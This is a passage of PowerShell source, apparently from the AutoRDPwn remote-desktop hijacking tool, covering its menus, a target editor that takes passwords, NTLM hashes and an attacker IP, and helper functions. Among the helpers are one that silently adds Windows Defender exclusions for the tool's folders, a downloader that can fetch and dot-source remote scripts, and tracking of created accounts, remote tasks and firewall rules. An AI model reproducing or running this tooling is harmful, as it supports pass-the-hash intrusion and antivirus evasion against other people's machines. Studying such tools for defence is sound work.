        @{ Key = 'Password'; Label = 'Password' },
        @{ Key = 'Hash'; Label = 'NTLM hash' },
        @{ Key = 'Domain'; Label = 'Domain' },
        @{ Key = 'AttackerIP'; Label = 'Attacker IP' },
        @{ Key = 'Mode'; Label = 'Mode' }
    )
    Start-ARTuiFrame -Screen 'target'
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left 'Target editor' -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
    Write-ARBoxRule -Width $boxWidth -Label 'TARGET' -Color 'DarkCyan'
    for ($i = 0; $i -lt $fields.Count; $i++) {
        $field = $fields[$i]
        $value = [string]$script:ARTarget[$field.Key]
        if ($field.Key -eq 'Password' -and $value -ne '') { $value = '********' }
        if ($field.Key -eq 'Hash' -and $value -ne '') {
            if ($value.Length -gt 16) { $value = $value.Substring(0, 16) + '...' }
        }
        if ($field.Key -eq 'AttackerIP' -and $value -eq '') { $value = 'auto' }
        if ($field.Key -eq 'User' -and $value -eq '') { $value = '(current user)' }
        if ($value -eq '') { $value = '(not set)' }
        $marker = if ($i -eq $Index) { '>' } else { ' ' }
        $prefix = '{0} ' -f $marker
        $line = $prefix + (Format-ARLeader -Label ('{0,-12} :' -f $field.Label) -Right $value -Width ($contentWidth - $prefix.Length) -Fill ' ')
        if ($i -eq $Index) {
            Write-ARBoxLine $line $boxWidth 'Black' 'Cyan'
        }
        else {
            Write-ARBoxLine $line $boxWidth 'White'
        }
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    Write-ARBoxLine (' Status: ' + [string]$script:ARStatus['Text']) $boxWidth (Get-ARStatusColor)
    Write-ARBoxLine ' Up/Down move   Enter edit   P profiles   S save   Esc cancel' $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Read-ARLineValue {
    param([string]$Prompt)
    $restoreHidden = $script:ARTuiFrameActive
    if ($restoreHidden) { try { [Console]::CursorVisible = $true } catch { } }
    Write-Host $Prompt -NoNewline -ForegroundColor Yellow
    try { return $Host.UI.ReadLine() }
    catch { return $null }
    finally {
        if ($restoreHidden) { try { [Console]::CursorVisible = $false } catch { } }
    }
}

function Read-ARSecretValue {
    param([string]$Prompt)
    $restoreHidden = $script:ARTuiFrameActive
    if ($restoreHidden) { try { [Console]::CursorVisible = $true } catch { } }
    Write-Host $Prompt -NoNewline -ForegroundColor Yellow
    try {
        $secure = $Host.UI.ReadLineAsSecureString()
        if ($null -eq $secure) { return '' }
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        try {
            return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
        }
        finally {
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
        }
    }
    catch { return '' }
    finally {
        if ($restoreHidden) { try { [Console]::CursorVisible = $false } catch { } }
    }
}

function Edit-ARTargetField {
    param([hashtable]$Field)
    if ($Field.Key -eq 'Mode') {
        if ($script:ARTarget['Mode'] -eq 'control') { $script:ARTarget['Mode'] = 'view' }
        else { $script:ARTarget['Mode'] = 'control' }
        return
    }
    if ($Field.Key -eq 'Password') {
        $value = Read-ARSecretValue ' New password (Enter keeps, - clears): '
        if ($null -eq $value) { return }
        if ($value -eq '-') { $script:ARTarget['Password'] = '' }
        elseif ($value -ne '') { $script:ARTarget['Password'] = $value }
        return
    }
    $current = [string]$script:ARTarget[$Field.Key]
    $value = Read-ARLineValue (' {0} [{1}]: ' -f $Field.Label, $current)
    if ($null -eq $value) { return }
    $value = $value.Trim()
    if ($value -eq '') {
        if ($Field.Key -eq 'Computer') { $script:ARTarget['Computer'] = 'localhost' }
        elseif ($Field.Key -eq 'User') { $script:ARTarget['User'] = '' }
        else { $script:ARTarget[$Field.Key] = '' }
        return
    }
    if ($Field.Key -eq 'Mode') {
        if ($value -match '^1$|control') { $script:ARTarget['Mode'] = 'control' }
        elseif ($value -match '^2$|view') { $script:ARTarget['Mode'] = 'view' }
        return
    }
    $script:ARTarget[$Field.Key] = $value
}

function Show-ARTargetForm {
    $fields = @(
        @{ Key = 'Computer'; Label = 'Target host' },
        @{ Key = 'User'; Label = 'User' },
        @{ Key = 'Password'; Label = 'Password' },
        @{ Key = 'Hash'; Label = 'NTLM hash' },
        @{ Key = 'Domain'; Label = 'Domain' },
        @{ Key = 'AttackerIP'; Label = 'Attacker IP' },
        @{ Key = 'Mode'; Label = 'Mode' }
    )
    $index = 0
    while ($true) {
        Show-ARTargetFormScreen -Index $index
        if ($script:ARTestMode) { return $false }
        try { $key = [Console]::ReadKey($true) } catch { return $false }
        switch ($key.Key) {
            'UpArrow' {
                $index--
                if ($index -lt 0) { $index = $fields.Count - 1 }
            }
            'DownArrow' {
                $index++
                if ($index -ge $fields.Count) { $index = 0 }
            }
            'Home' { $index = 0 }
            'End' { $index = $fields.Count - 1 }
            'Enter' {
                Edit-ARTargetField -Field $fields[$index]
            }
            'Escape' { return $true }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'S') { $null = Save-ARCurrentTarget }
                if ($character -eq 'P') { $null = Show-ARTargetPicker }
                if ($character -eq 'Q') { return $false }
            }
        }
    }
}

function Read-ARLineTargetForm {
    $labels = @(
        @{ Key = 'Computer'; Text = 'Target host' },
        @{ Key = 'User'; Text = 'User' },
        @{ Key = 'Hash'; Text = 'NTLM hash' },
        @{ Key = 'Domain'; Text = 'Domain' },
        @{ Key = 'AttackerIP'; Text = 'Attacker IP' }
    )
    foreach ($field in $labels) {
        $current = [string]$script:ARTarget[$field.Key]
        $value = Read-ARLineValue (' {0} [{1}]: ' -f $field.Text, $current)
        if ($null -eq $value) { continue }
        $value = $value.Trim()
        if ($value -ne '') { $script:ARTarget[$field.Key] = $value }
        elseif ($field.Key -eq 'Computer') { $script:ARTarget['Computer'] = 'localhost' }
    }
    $password = Read-ARSecretValue ' New password (Enter keeps, - clears): '
    if ($null -ne $password) {
        if ($password -eq '-') { $script:ARTarget['Password'] = '' }
        elseif ($password -ne '') { $script:ARTarget['Password'] = $password }
    }
    $mode = Read-ARLineValue (' Mode [1 control, 2 view] [{0}]: ' -f $script:ARTarget['Mode'])
    if ($null -ne $mode) {
        $mode = $mode.Trim()
        if ($mode -match '^1$|control') { $script:ARTarget['Mode'] = 'control' }
        elseif ($mode -match '^2$|view') { $script:ARTarget['Mode'] = 'view' }
    }
}

function Show-ARLanguagePicker {
    $languages = @('English', 'Spanish', 'French', 'German', 'Italian', 'Russian', 'Portuguese')
    $index = [Array]::IndexOf($languages, $script:ARLocaleName)
    if ($index -lt 0) { $index = 0 }
    while ($true) {
        $width = Get-ARConsoleWidth
        $boxWidth = [Math]::Max(40, $width - 1)
        Start-ARTuiFrame -Screen 'language'
        Write-ARBoxBorder $boxWidth
        Write-ARBoxColumns -Left 'Language' -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
        Write-ARBoxRule -Width $boxWidth -Label 'LANGUAGES' -Color 'DarkCyan'
        for ($i = 0; $i -lt $languages.Count; $i++) {
            $marker = if ($i -eq $index) { '>' } else { ' ' }
            $line = ' {0} {1,2}. {2}' -f $marker, ($i + 1), $languages[$i]
            if ($i -eq $index) { Write-ARBoxLine $line $boxWidth 'Black' 'Cyan' }
            else { Write-ARBoxLine $line $boxWidth 'White' }
        }
        Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
        Write-ARBoxLine ' Up/Down move   Enter select   Esc cancel' $boxWidth 'DarkGray'
        Write-ARBoxBorder $boxWidth
        if ($script:ARTestMode) { return '' }
        try { $key = [Console]::ReadKey($true) } catch { return '' }
        switch ($key.Key) {
            'UpArrow' {
                $index--
                if ($index -lt 0) { $index = $languages.Count - 1 }
            }
            'DownArrow' {
                $index++
                if ($index -ge $languages.Count) { $index = 0 }
            }
            'Enter' {
                $script:ARLocaleName = $languages[$index]
                Set-ARLastLanguage $languages[$index]
                return $languages[$index]
            }
            'Escape' { return '' }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'Q') { return '' }
                if ($character -match '^[1-7]$') {
                    $languageIndex = [int]::Parse($character) - 1
                    $script:ARLocaleName = $languages[$languageIndex]
                    Set-ARLastLanguage $languages[$languageIndex]
                    return $languages[$languageIndex]
                }
            }
        }
    }
}

function Show-ARTui {
    param([string]$InitialId = '')

    if (-not [string]::IsNullOrWhiteSpace($InitialId)) {
        $action = Get-ARActionById $InitialId
        if ($null -ne $action) {
            $script:ARSelectedId = $action.Id
            $script:ARTuiLevel = 'actions'
        }
    }
    $script:ARScroll = 0
    $script:ARCategoryScroll = 0
    if (-not $script:ARTestMode) {
        try { [Console]::CursorVisible = $false } catch { }
    }
    try {
        while ($true) {
            Show-ARTuiScreen
            if ($script:ARTestMode) { return 'TEST' }
            $key = $null
            if ($null -ne $script:ARPendingKey) {
                $key = $script:ARPendingKey
                $script:ARPendingKey = $null
            }
            else {
                try { $key = [Console]::ReadKey($true) } catch { return 'QUIT' }
            }
            if ($null -eq $key) { continue }

            if ($key.Key -eq 'UpArrow') {
                Move-ARTuiSelection -Delta -1
                continue
            }
            if ($key.Key -eq 'DownArrow') {
                Move-ARTuiSelection -Delta 1
                continue
            }
            if ($key.Key -eq 'PageUp') {
                Move-ARTuiSelection -Delta -1 -Page
                continue
            }
            if ($key.Key -eq 'PageDown') {
                Move-ARTuiSelection -Delta 1 -Page
                continue
            }
            if ($key.Key -eq 'Home') {
                Set-ARTuiSelectionEdge
                continue
            }
            if ($key.Key -eq 'End') {
                Set-ARTuiSelectionEdge -Last
                continue
            }
            if ($key.Key -eq 'RightArrow') {
                if ($script:ARTuiLevel -eq 'categories') {
                    $category = Get-ARCurrentCategory
                    if ($null -ne $category) { Enter-ARTuiCategory -Key $category.Key }
                }
                continue
            }
            if ($key.Key -eq 'LeftArrow') {
                Step-ARTuiBack
                continue
            }
            if ($key.Key -eq 'Enter') {
                if ($script:ARTuiLevel -eq 'categories') {
                    $category = Get-ARCurrentCategory
                    if ($null -ne $category) { Enter-ARTuiCategory -Key $category.Key }
                    continue
                }
                $action = Get-ARCurrentAction
                if ($null -ne $action) {
                    $script:ARSelectedId = $action.Id
                    return ('ACTION:' + $action.Id)
                }
                Set-ARStatus (Get-ARText 'txt150' 'No item matches the current filter') 'Warn'
                continue
            }
            if ($key.Key -eq 'Escape' -or $key.Key -eq 'Backspace') {
                Step-ARTuiBack
                continue
            }
            if ($key.Key -eq 'F1') {
                Show-ARHelp -Level $script:ARTuiLevel -CategoryTitle (Get-ARCategoryLabel)
                continue
            }

            $character = $key.KeyChar.ToString().ToUpperInvariant()
            if ($character -eq 'Q' -or $character -eq 'X') { return 'QUIT' }
            if ($character -eq 'L') { return 'LANGUAGE' }
            if ($character -eq 'T') {
                if (Show-ARTargetForm) { Set-ARStatus 'Target updated' 'Ok' }
                continue
            }
            if ($character -eq 'P') { $null = Show-ARTargetPicker; continue }
            if ($character -eq 'S') { $null = Save-ARCurrentTarget; continue }
            if ($character -eq 'R') {
                if ($script:ARFilter -ne '') {
                    $script:ARFilter = ''
                    Set-ARStatus (Get-ARText 'txt154' 'Filter cleared') 'Info'
                }
                continue
            }
            if ($character -eq '/') {
                $previous = $script:ARFilter
                $maxLength = [Math]::Max(8, (Get-ARConsoleWidth) - 24)
                Show-ARTuiScreen -Prompt 'filter'
                $typed = Read-ARTuiInlineInput -Row $script:ARTuiPromptRow -Column 10 -Initial $previous -MaxLength $maxLength -OnChange {
                    param($value)
                    $script:ARFilter = [string]$value
                    Show-ARTuiScreen -Prompt 'filter'
                }
                if ($null -eq $typed) {
                    $script:ARFilter = $previous
                    Set-ARStatus (Get-ARText 'txt153' 'Filter cancelled') 'Info'
                }
                else {
                    $script:ARFilter = [string]$typed
                    if ($script:ARFilter -eq '') {
                        Set-ARStatus (Get-ARText 'txt154' 'Filter cleared') 'Info'
                    }
                    else {
                        Set-ARStatus ((Get-ARText 'txt152' 'Filter applied') + ': ' + $script:ARFilter) 'Info'
                    }
                }
                continue
            }
            if ($key.KeyChar -match '^\d$') {
                $digits = Read-ARTuiNumberInput -FirstDigit $key.KeyChar.ToString()
                if (-not (Resolve-ARTuiNumber -Digits $digits)) {
                    Set-ARStatus ((Get-ARText 'txt6' 'Incorrect option, try again') + ': ' + $digits) 'Warn'
                }
                continue
            }
        }
    }
    finally {
        Stop-ARTuiFrame
    }
}

function Show-ARLineCategoryList {
    param([int]$Width = 79)
    $boxWidth = [Math]::Max(40, $Width)
    $categories = @(Get-ARActionCategories)
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn v' + (Get-ARVersionLabel) + ' - line mode') -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
    Write-ARBoxLine ('Target: {0}  User: {1}  Mode: {2}  Session: {3}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode'], $script:ARSessionState) $boxWidth 'Gray'
    Write-ARBoxRule -Width $boxWidth -Label 'CATEGORIES' -Color 'DarkCyan'
    for ($index = 0; $index -lt $categories.Count; $index++) {
        $category = $categories[$index]
        $count = Format-ARItemCount -Count $category.Actions.Count -Plural (Get-ARText 'txt146' 'actions')
        $prefix = ' {0,2}. ' -f ($index + 1)
        $line = $prefix + (Format-ARLeader -Label ([string]$category.Title) -Right $count -Width ($boxWidth - 4 - $prefix.Length))
        Write-ARBoxLine $line $boxWidth 'White'
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    Write-ARBoxLine (' Status: ' + [string]$script:ARStatus['Text']) $boxWidth (Get-ARStatusColor)
    Write-ARBoxLine ' [digits] category   [L] language   [T] target   [P] profiles   [S] save   [Q] quit' $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Show-ARLineActionList {
    param($Category, [int]$Width = 79)
    $boxWidth = [Math]::Max(40, $Width)
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn > ' + [string]$Category.Title) -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
    Write-ARBoxLine ('Target: {0}  User: {1}  Mode: {2}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode']) $boxWidth 'Gray'
    Write-ARBoxRule -Width $boxWidth -Label 'ACTIONS' -Color 'DarkCyan'
    $actions = @($Category.Actions)
    for ($index = 0; $index -lt $actions.Count; $index++) {
        $action = $actions[$index]
        Write-ARBoxLine (' {0,2}. [{1,3}] {2}' -f ($index + 1), [string]$action.Id, [string]$action.Title) $boxWidth 'White'
        Write-ARBoxLine ('      ' + [string]$action.Description) $boxWidth 'DarkGray'
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    Write-ARBoxLine (' Status: ' + [string]$script:ARStatus['Text']) $boxWidth (Get-ARStatusColor)
    Write-ARBoxLine ' [number] run   [B] back   [L] language   [T] target   [P] profiles   [S] save   [Q] quit' $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Show-ARLineCatalogDump {
    param([int]$Width = 79)
    $boxWidth = [Math]::Max(40, $Width)
    $categories = @(Get-ARActionCategories)
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn v' + (Get-ARVersionLabel) + ' - line mode') -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
    Write-ARBoxLine ('Target: {0}  User: {1}  Mode: {2}  Session: {3}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode'], $script:ARSessionState) $boxWidth 'Gray'
    foreach ($category in $categories) {
        Write-ARBoxRule -Width $boxWidth -Label ([string]$category.Title).ToUpperInvariant() -Color 'DarkCyan'
        foreach ($action in $category.Actions) {
            Write-ARBoxLine (' [{0,3}] {1}' -f [string]$action.Id, [string]$action.Title) $boxWidth 'White'
            Write-ARBoxLine ('       ' + [string]$action.Description) $boxWidth 'DarkGray'
        }
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    $footer = Get-ARText 'txt162' '[L] language  [T] target  [P] profiles  [S] save target  [Q] quit'
    Write-ARBoxLine (' ' + $footer) $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Show-ARLineMenu {
    $width = Get-ARConsoleWidth
    $inner = [Math]::Max(40, $width - 1)
    if ($script:ARTestMode) {
        Show-ARLineCatalogDump -Width $inner
        return ''
    }
    $category = Get-ARCategoryByKey $script:ARLineCategoryKey
    while ($true) {
        Clear-ARScreen
        if ($null -eq $category) {
            Show-ARLineCategoryList -Width $inner
            $answer = Read-ARLineValue ' Choose a category:'
            if ($null -eq $answer) { return 'QUIT' }
            $value = $answer.Trim()
            if ($value -eq '') { continue }
            if ($value -match '^\d+$') {
                $categories = @(Get-ARActionCategories)
                $index = 0
                if ([int]::TryParse($value, [ref]$index)) {
                    $index = $index - 1
                    if ($index -ge 0 -and $index -lt $categories.Count) {
                        $category = $categories[$index]
                        $script:ARLineCategoryKey = $category.Key
                        continue
                    }
                }
            }
            $code = Resolve-ARSelection $value
            if ($code -in @('QUIT', 'TARGET', 'PROFILES', 'SAVE', 'LANGUAGE')) { return $code }
            if ($code -like 'ACTION:*') { return $code }
            Set-ARStatus ((Get-ARText 'txt6' 'Incorrect option, try again') + ': ' + $value) 'Warn'
            continue
        }

        Show-ARLineActionList -Category $category -Width $inner
        $answer = Read-ARLineValue ' Choose an action:'
        if ($null -eq $answer) { return 'QUIT' }
        $value = $answer.Trim()
        if ($value -eq '') { continue }
        $upper = $value.ToUpperInvariant()
        if ($upper -in @('B', 'BACK', '..')) {
            $category = $null
            $script:ARLineCategoryKey = ''
            continue
        }
        if ($value -match '^\d+$') {
            $actions = @($category.Actions)
            $index = 0
            if ([int]::TryParse($value, [ref]$index)) {
                $index = $index - 1
                if ($index -ge 0 -and $index -lt $actions.Count) {
                    $script:ARLineCategoryKey = $category.Key
                    return ('ACTION:' + $actions[$index].Id)
                }
            }
        }
        $code = Resolve-ARSelection $value
        if ($code -in @('QUIT', 'TARGET', 'PROFILES', 'SAVE', 'LANGUAGE')) { return $code }
        if ($code -like 'ACTION:*') {
            $script:ARLineCategoryKey = $category.Key
            return $code
        }
        Set-ARStatus ((Get-ARText 'txt6' 'Incorrect option, try again') + ': ' + $value) 'Warn'
    }
}

function Show-ARLineTargetForm {
    Clear-ARScreen
    Write-ARLine 'Target editor (line mode)' 'Yellow'
    Read-ARLineTargetForm
    Set-ARStatus 'Target updated' 'Ok'
}

function Show-ARLineTargetPicker {
    $profiles = @(Get-ARTargetProfiles)
    if ($profiles.Count -eq 0) {
        Write-ARWarn (Get-ARText 'txt132' 'No saved targets. Edit a target and press S to save it.')
        return $false
    }
    Clear-ARScreen
    Write-ARLine (Get-ARText 'txt136' 'Saved target profiles') 'Yellow'
    Write-ARLine ('-' * ((Get-ARConsoleWidth) - 1)) 'DarkGray'
    for ($index = 0; $index -lt $profiles.Count; $index++) {
        $profile = $profiles[$index]
        $name = [string]$profile.Name
        if ([string]::IsNullOrWhiteSpace($name)) { $name = '(unnamed)' }
        Write-ARLine (' {0}. {1}  [{2}]' -f ($index + 1), $name, $profile.Computer) 'Gray'
    }
    Write-ARLine ('-' * ((Get-ARConsoleWidth) - 1)) 'DarkGray'
    $choice = Read-ARValue ('Target profile (1-' + $profiles.Count + ')') '1'
    $selectedIndex = 0
    if (-not [int]::TryParse($choice, [ref]$selectedIndex)) {
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
        return $false
    }
    $selectedIndex = $selectedIndex - 1
    if ($selectedIndex -lt 0 -or $selectedIndex -ge $profiles.Count) {
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
        return $false
    }
    $null = Apply-ARTargetProfile $profiles[$selectedIndex]
    Set-ARStatus ((Get-ARText 'txt134' 'Target loaded') + ': ' + [string]$profiles[$selectedIndex].Name) 'Ok'
    return $true
}

$script:ARSession = $null
$script:AROverrideCredential = $null
$script:ARDefenderAvailable = $false
$script:ARDefenderAddedPaths = New-Object System.Collections.Generic.List[string]
$script:ARWorkDirs = New-Object System.Collections.Generic.List[string]
$script:ARTemporaryFiles = New-Object System.Collections.Generic.List[string]
$script:ARRemoteTempDirs = New-Object System.Collections.Generic.List[string]
$script:ARHashUserName = ''
$script:ARCreatedAccounts = New-Object System.Collections.Generic.List[string]
$script:ARRemoteTasks = New-Object System.Collections.Generic.List[string]
$script:ARFirewallRules = New-Object System.Collections.Generic.List[string]
$script:ARCmdKeyTargets = New-Object System.Collections.Generic.List[string]
$script:ARCleanupDone = $false
$script:ARLastFailure = ''
$script:ARRegistryBackup = New-Object System.Collections.Generic.List[object]
$script:ARInstalledProducts = New-Object System.Collections.Generic.List[string]

function Invoke-ARDownload {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$OutFile
    )
    $oldProgress = $ProgressPreference
    $ProgressPreference = 'SilentlyContinue'
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
    }
    catch {
        try { (New-Object Net.WebClient).DownloadFile($Url, $OutFile) }
        catch { throw "Download failed: $Url" }
    }
    finally { $ProgressPreference = $oldProgress }
    if (-not (Test-Path -LiteralPath $OutFile)) { throw "Download failed: $Url" }
}

function Get-ARResourcePath {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $normalized = $RelativePath -replace '/', '\'
    $localPath = Join-Path $script:ARRoot $normalized
    if (Test-Path -LiteralPath $localPath) { return $localPath }
    # Fail closed: a missing resource is a broken install, not a reason to pull
    # code from the network and dot-source it with administrator rights.
    if ($env:AUTORD_PWN_ALLOW_DOWNLOAD -ne '1') {
        throw ('Missing resource: ' + $localPath + '. Restore it from the repository (set AUTORD_PWN_ALLOW_DOWNLOAD=1 to fetch it from ' + $script:ARRepository + ').')
    }
    $parent = Split-Path -Parent $localPath
    if (-not (Test-Path -LiteralPath $parent)) { New-Item -ItemType Directory -Path $parent -Force | Out-Null }
    $url = $script:ARRepository + '/' + ($normalized -replace '\\', '/')
    Invoke-ARDownload -Url $url -OutFile $localPath
    return $localPath
}

function Import-ARToolScript {
    param([Parameter(Mandatory = $true)][string]$RelativePath)
    $path = Get-ARResourcePath $RelativePath
    $before = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    Push-Location $script:ARTools
    try { . $path }
    finally { Pop-Location }
    $after = @(Get-ChildItem -LiteralPath $script:ARTools -File -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
    foreach ($file in $after) {
        if ($before -notcontains $file) { $script:ARTemporaryFiles.Add($file) }
    }
}

function Resolve-ARLanguageName {
    param([string]$Name = '')
    $map = @{
        '1' = 'English'; '2' = 'Spanish'; '3' = 'French'; '4' = 'German'
        '5' = 'Italian'; '6' = 'Russian'; '7' = 'Portuguese'
        'en' = 'English'; 'es' = 'Spanish'; 'fr' = 'French'; 'de' = 'German'
        'it' = 'Italian'; 'ru' = 'Russian'; 'pt' = 'Portuguese'
        'english' = 'English'; 'spanish' = 'Spanish'; 'french' = 'French'; 'german' = 'German'
        'italian' = 'Italian'; 'russian' = 'Russian'; 'portuguese' = 'Portuguese'
    }
    if ([string]::IsNullOrWhiteSpace($Name)) {
        $culture = ''
        try { $culture = (Get-Culture).TwoLetterISOLanguageName.ToLowerInvariant() } catch { }
        if ($map.ContainsKey($culture)) { return $map[$culture] }
        return 'English'
    }
    $key = $Name.Trim().ToLowerInvariant()
    if ($map.ContainsKey($key)) { return $map[$key] }
    if ($key.Length -ge 2 -and $map.ContainsKey($key.Substring(0, 2))) { return $map[$key.Substring(0, 2)] }
    return 'English'
}

function Initialize-ARLanguage {
    param([string]$Name = '')
    $resolved = Resolve-ARLanguageName $Name
    $englishPath = Get-ARResourcePath 'Resources\Languages\English.ps1'
    Import-ARLanguage -Path $englishPath -AsFallback
    Import-ARLanguage -Path $englishPath
    if ($resolved -ne 'English') {
        try {
            $languagePath = Get-ARResourcePath ('Resources\Languages\' + $resolved + '.ps1')
            Import-ARLanguage -Path $languagePath
        }
        catch {
            $resolved = 'English'
        }
    }
    Set-ARLanguageName $resolved
    if (Get-Command Reset-ARActionCatalogCache -ErrorAction SilentlyContinue) {
        Reset-ARActionCatalogCache
    }
}

function Get-ARLocalIPv4 {
    param([string]$Target = '')
    if (-not [string]::IsNullOrWhiteSpace($Target) -and $Target -notin @('localhost', '127.0.0.1', '::1', '.')) {
        try {
            $best = Find-NetRoute -RemoteIPAddress $Target -ErrorAction Stop | Select-Object -First 1
            if ($best -and $best.IPAddress -and $best.IPAddress -notlike '169.254.*') {
                return [string]$best.IPAddress
            }
        }
        catch { }
    }
    try {
        $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop |
            Sort-Object RouteMetric, InterfaceMetric |
            Select-Object -First 1
        if ($route) {
            $address = Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1
            if ($address) { return [string]$address.IPAddress }
        }
    }
    catch { }
    try {
        $virtual = 'vEthernet|VPN|TAP|ZeroTier|Loopback|Bluetooth|OpenVPN|WireGuard|Hyper-V|Pseudo'
        $address = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
            Where-Object { $_.IPAddress -ne '127.0.0.1' -and $_.IPAddress -notlike '169.254.*' } |
            Sort-Object { if ($_.InterfaceAlias -match $virtual) { 1 } else { 0 } } |
            Select-Object -First 1
        if ($address) { return [string]$address.IPAddress }
    }
    catch { }
    return ''
}

function Test-ARPort {
    param(
        [Parameter(Mandatory = $true)][string]$Computer,
        [Parameter(Mandatory = $true)][int]$Port,
        [int]$TimeoutMs = 2000
    )
    if ([string]::IsNullOrWhiteSpace($Computer)) { return $false }
    if ($Computer -in @('localhost', '127.0.0.1', '::1', '.')) { return $true }
    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $async = $client.BeginConnect($Computer, $Port, $null, $null)
        if (-not $async.AsyncWaitHandle.WaitOne($TimeoutMs, $false)) { return $false }
        $client.EndConnect($async)
        return $true
    }
    catch { return $false }
    finally { $client.Close() }
}

function Assert-ARPort {
    param(
        [Parameter(Mandatory = $true)][string]$Computer,
        [Parameter(Mandatory = $true)][int]$Port,
        [string]$Purpose = 'This action'
    )
    if (Test-ARPort -Computer $Computer -Port $Port) { return }
    throw ($Purpose + ' needs TCP ' + $Port + ' on ' + $Computer + ' and it is closed or filtered.')
}

function Initialize-ARDefender {    $script:ARDefenderAddedPaths.Clear()
    try {
        $preference = Get-MpPreference -ErrorAction Stop
    }
    catch { return }
    $script:ARDefenderAvailable = $true
    $existingPaths = @($preference.ExclusionPath | Where-Object { $_ })
    $paths = @($script:ARRoot, $script:ARTools, (Join-Path $env:TEMP 'AutoRDPwn'))
    foreach ($path in $paths) {
        if ([string]::IsNullOrWhiteSpace($path)) { continue }
        if (-not (Test-Path -LiteralPath $path)) { continue }
        if ($existingPaths -contains $path) { continue }
        try {
            Add-MpPreference -ExclusionPath $path -ErrorAction Stop
            $script:ARDefenderAddedPaths.Add($path)
        } catch { }
    }
}

function Restore-ARDefender {
    if (-not $script:ARDefenderAvailable) { return }
    foreach ($path in $script:ARDefenderAddedPaths.ToArray()) {
        try { Remove-MpPreference -ExclusionPath $path -ErrorAction Stop } catch { }
    }
    $script:ARDefenderAddedPaths.Clear()
}

function Write-ARInfo { param([string]$Text); Write-Host ('[i] ' + $Text) -ForegroundColor Green }
function Write-ARSuccess { param([string]$Text); Write-Host ('[+] ' + $Text) -ForegroundColor Blue }
function Write-ARWarn { param([string]$Text); Write-Host ('[!] ' + $Text) -ForegroundColor Yellow }
function Write-ARError { param([string]$Text); Write-Host ('[!] ' + $Text) -ForegroundColor Red }
function Write-ARBlank { Write-Host '' }

function Read-ARValue {
    param([string]$Prompt, [string]$Default = '')
    if ($script:ARInvokedFromOption) {
        throw ('Missing value for "' + $Prompt + '": it cannot be prompted for in -option mode.')
    }
    while ($true) {
        $suffix = ': '
        if ($Default -ne '') { $suffix = ' [' + $Default + ']: ' }
        $value = Read-ARLineValue (' ' + $Prompt + $suffix)
        if ($null -eq $value) { $value = '' }
        $value = $value.Trim()
        if ($value -eq '' -and $Default -ne '') { return $Default }
        if ($value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Read-ARSecret {
    param([string]$Prompt = 'Password')
    if ($script:ARInvokedFromOption) {
        throw ('Missing value for "' + $Prompt + '": it cannot be prompted for in -option mode.')
    }
    while ($true) {
        $value = Read-ARSecretValue (' ' + $Prompt + ': ')
        if ($null -ne $value -and $value -ne '') { return $value }
        Write-ARWarn (Get-ARText 'txt6' 'Incorrect option, try again')
    }
}

function Show-ARText {
    param($Value, [switch]$Copy)
    if ($null -eq $Value) { return }
    $text = ($Value | Out-String).TrimEnd()
    if ($text -eq '') { return }
    Write-Host $text
    # Clipboard is opt-in: results can contain credentials and dumps.
    if ($Copy -and $text.Length -lt 1048576) {
        try { Set-Clipboard -Value $text } catch { }
    }
}

function Test-ARIsLocalTarget {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return $true }
    $names = @('localhost', '127.0.0.1', '::1', '.', $env:COMPUTERNAME)
    try { $names += [System.Net.Dns]::GetHostName() } catch { }
    return ($names -contains $computer)
}

function Get-ARTargetComputer {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { return 'localhost' }
    return $computer
}

function Get-ARTargetUserName {
    $user = [string]$script:ARTarget['User']
